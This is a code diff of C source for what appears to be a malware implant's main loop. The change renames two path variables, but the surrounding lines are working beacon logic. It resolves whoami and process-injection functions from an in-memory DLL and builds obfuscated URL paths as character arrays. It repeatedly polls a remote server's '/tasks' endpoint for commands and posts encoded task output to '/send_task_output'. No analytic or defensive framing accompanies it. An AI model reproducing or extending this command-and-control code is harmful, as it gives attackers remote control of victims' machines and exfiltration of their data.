@@ -666,7 +666,7 @@ void myMain()
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
     PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);
 
-    WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
+    WCHAR pathTasks[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
 
     CHAR* jsonResponse = NULL;
     CHAR* orgOutput = NULL;
@@ -684,7 +684,7 @@ void myMain()
     };
     DWORD totalJsonSize;
     CHAR* json;
-    WCHAR fullPath2[] =
+    WCHAR pathSendTaskOutput[] =
     {
         '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
         't', '/', UUID_M
@@ -692,7 +692,7 @@ void myMain()
 
     while (TRUE)
     {
-        jsonResponse = GetRequest(api, wServer, port, fullPath);
+        jsonResponse = GetRequest(api, wServer, port, pathTasks);
 
         if (!jsonResponse)
         {
@@ -737,7 +737,7 @@ void myMain()
             totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.uuid) + 16;
             json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
             ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, encodedExitOutput);
-            PostRequest(api, wServer, port, fullPath2, json);
+            PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
             if (pEsgStdDll->pBuffer)
             {
@@ -783,7 +783,7 @@ void myMain()
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         // fill the jsonFormat with relevant values
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, b64EncodedOutput);
-        PostRequest(api, wServer, port, fullPath2, json);
+        PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
         if (task.taskId)
         {
